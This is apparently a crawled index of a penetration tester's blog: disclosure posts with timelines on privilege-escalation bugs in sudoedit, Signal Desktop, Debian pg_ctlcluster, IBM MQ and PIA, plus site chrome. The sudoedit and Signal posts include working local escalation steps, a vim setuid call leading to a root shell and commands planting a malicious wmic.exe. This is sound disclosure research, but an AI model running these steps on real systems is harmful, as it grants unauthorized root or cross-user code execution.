2019-01-23 Mitre assigned CVE-2019-6724

2019-02-14 Public Disclosure

### Share this:

* [Twitter](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Linux](https://blog.mirch.io/category/linux/)Tags: [exploit](https://blog.mirch.io/tag/exploit/), [Linux](https://blog.mirch.io/tag/linux/)

## Post navigation

[Linux persistence idea – using group passwords](https://blog.mirch.io/2019/01/09/linux-persistence-idea-using-group-passwords/)[Write-up for CVE-2018-15332 , CVE-2018-5529 , CVE-2018-5546 , CVE-2019-6617](https://blog.mirch.io/2019/05/21/243/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F02%252F14%252Fcve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F02%252F14%252Fcve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos%252F)
  + [Copy shortlink](https://wp.me/paoR5j-39)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/02/14/cve-2019-6724-barracuda-vpn-client-privilege-escalation-on-linux-and-macos/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/195)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_876decba_20250121_032059.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance – Part 1 — May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance – Part 1")

## [Exploiting Kaseya Unitrends Backup Appliance – Part 1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability — January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS Vulnerability — December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

## [Pi-hole Patches Critical Stored XSS Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation — September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi Routers — September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi Routers")

## [Critical Vulnerabilities Discovered in MoFi Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> — TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of Privilege — March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> — Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability — December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster — November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading →](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH — August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

## [CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading →](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine — June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Continue reading →](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from github.com_f5d98d86_20250121_032058.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FCVE-2019-6724.sh)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
